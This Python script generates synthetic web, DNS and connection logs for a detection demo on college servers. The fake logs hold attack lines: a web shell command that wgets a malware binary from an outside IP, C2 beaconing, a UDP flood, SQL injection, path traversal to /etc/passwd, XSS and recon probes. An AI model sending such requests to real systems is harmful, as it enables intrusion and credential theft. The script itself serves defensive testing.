"""First45 - synthetic demo logs.

Creates realistic but FAKE logs for five college servers, so we can demo
detection safely. No real traffic, no real exploit code: exploit payloads are
written as "PAYLOAD-REDACTED". Attacker IPs are the public, published IOCs from
PHP2Shell reporting, plus documentation-only ranges (198.51.100.x, 203.0.113.x).

Run:  python make_demo_logs.py      -> writes demo_logs/*.tsv
"""
from __future__ import annotations

import csv
import random
from datetime import datetime, timedelta
from pathlib import Path

OUT = Path(__file__).resolve().parent / "demo_logs"
random.seed(45)
T0 = datetime(2026, 10, 22, 9, 0, 0)

HOSTS = [
    # host,          ip,          role,              php
    ("web-library", "10.0.0.11", "library website", "8.3.36"),   # patched, only scanned
    ("web-club",    "10.0.0.12", "student club site", "8.1.2"),  # no patch exists -> compromised
    ("web-hostel",  "10.0.0.13", "hostel portal",   "8.2.10"),   # brute force + SQL injection tries
    ("web-fest",    "10.0.0.14", "fest website",    "8.4.27"),   # recon scan only
    ("mail-dept",   "10.0.0.15", "department mail", "none"),     # clean
]

UA = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/141.0",
      "Mozilla/5.0 (Linux; Android 15) Mobile Safari/537.36",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) Safari/605.1"]
PAGES = ["/", "/index.php", "/about.php", "/events.php", "/contact.php",
         "/assets/app.css", "/assets/logo.png", "/news.php?id=12", "/gallery.php"]

web, dns, conn = [], [], []


def ts(minutes: float) -> str:
    return (T0 + timedelta(minutes=minutes)).strftime("%Y-%m-%d %H:%M:%S")


def normal_traffic() -> None:
    for host, ip, _, _ in HOSTS:
        for _ in range(140):
            m = random.uniform(0, 300)
            client = f"10.20.{random.randint(1, 60)}.{random.randint(2, 250)}"
            web.append([ts(m), host, client, "GET", random.choice(PAGES), 200,
                        random.randint(800, 40000), random.choice(UA)])
        for _ in range(25):
            m = random.uniform(0, 300)
            dns.append([ts(m), host, random.choice(
                ["updates.ubuntu.com", "packages.sury.org", "api.github.com", "time.google.com"]), "NOERROR"])
            conn.append([ts(m), host, random.choice(["185.125.190.36", "140.82.112.6"]), 443, "tcp",
                         random.randint(2000, 90000), random.randint(10, 120), ""])


def php2shell_chain() -> None:
    """Published PHP2Shell -> Mirai chain against web-club (vulnerable) and web-library (patched)."""
    attackers = ["85.11.167.243", "217.60.242.76", "45.198.224.169"]
    # web-library is patched: attempts fail (400)
    for i, a in enumerate(attackers):
        web.append([ts(40 + i), "web-library", a, "POST", "/index.php?PAYLOAD-REDACTED", 400, 312, "-"])
    # web-club is on PHP 8.1 (no fix): attempt succeeds
    web.append([ts(52.0), "web-club", "85.11.167.243", "POST", "/index.php?PAYLOAD-REDACTED", 200, 74, "-"])
    # web shell dropped in the PHP session folder and used
    web.append([ts(53.5), "web-club", "85.11.167.243", "GET",
                "/tmp/sess_8f3a2c.php?cmd=uname%20-a", 200, 61, "-"])
    web.append([ts(54.0), "web-club", "85.11.167.243", "GET",
                "/tmp/sess_8f3a2c.php?cmd=wget%20http://92.118.112.100/bins/x86", 200, 18, "-"])
    # loader download (ELF)
    conn.append([ts(54.2), "web-club", "92.118.112.100", 80, "tcp", 410, 6, "GET /bins/x86 (application/x-elf)"])
    # C2 bootstrap: DNS + HTTP check, then beacons every 60 s on TCP 50792
    dns.append([ts(55.0), "web-club", "thunder.godofthunder.st", "NOERROR"])
    conn.append([ts(55.1), "web-club", "134.199.154.64", 80, "tcp", 380, 5, "GET / (application/x-elf)"])
    for k in range(40):
        conn.append([ts(56 + k * 1.0 + random.uniform(-0.02, 0.02)), "web-club", "134.199.154.64",
                     50792, "tcp", 96, 2, ""])
    # DDoS: UDP flood at a third party
    for k in range(6):
        conn.append([ts(100 + k * 0.2), "web-club", "45.88.138.44", 53, "udp",
                     random.randint(9_000_000, 12_000_000), random.randint(60_000, 90_000), "flood"])


def other_attacks() -> None:
    """Attacks not covered by any advisory: caught by behaviour detectors."""
    # brute force on hostel portal login
    for k in range(60):
        web.append([ts(120 + k * 0.05), "web-hostel", "203.0.113.50", "POST", "/login.php", 401, 220, "python-requests/2.32"])
    # SQL injection + path traversal attempts
    for path in ["/news.php?id=12%20UNION%20SELECT%20username,password%20FROM%20users",
                 "/news.php?id=12'%20OR%201=1--", "/download.php?file=../../../../etc/passwd",
                 "/search.php?q=<script>alert(1)</script>"]:
        web.append([ts(130 + random.uniform(0, 3)), "web-hostel", "198.51.100.23", "GET", path, 500, 512, "sqlmap/1.9"])
    # recon scan on fest website
    for k in range(80):
        web.append([ts(200 + k * 0.03), "web-fest", "198.51.100.77", "GET",
                    random.choice(["/.env", "/wp-admin/", "/phpmyadmin/", "/.git/config", "/admin.php",
                                   "/backup.zip", "/config.php.bak", "/server-status"]) + f"?r={k}",
                    404, 162, "Mozilla/5.0 zgrab/0.x"])


def write(name: str, header: list[str], rows: list[list]) -> None:
    rows.sort(key=lambda r: r[0])
    with open(OUT / name, "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f, delimiter="\t")
        w.writerow(header)
        w.writerows(rows)


def main() -> None:
    OUT.mkdir(exist_ok=True)
    normal_traffic()
    php2shell_chain()
    other_attacks()
    write("web.tsv", ["ts", "host", "client_ip", "method", "path", "status", "bytes", "user_agent"], web)
    write("dns.tsv", ["ts", "host", "query", "rcode"], dns)
    write("conn.tsv", ["ts", "host", "dst_ip", "dst_port", "proto", "bytes_out", "pkts_out", "detail"], conn)
    with open(OUT / "inventory.tsv", "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f, delimiter="\t")
        w.writerow(["host", "ip", "role", "php_version"])
        w.writerows(HOSTS)
    print(f"wrote {len(web)} web, {len(dns)} dns, {len(conn)} conn rows to {OUT}")


if __name__ == "__main__":
    main()
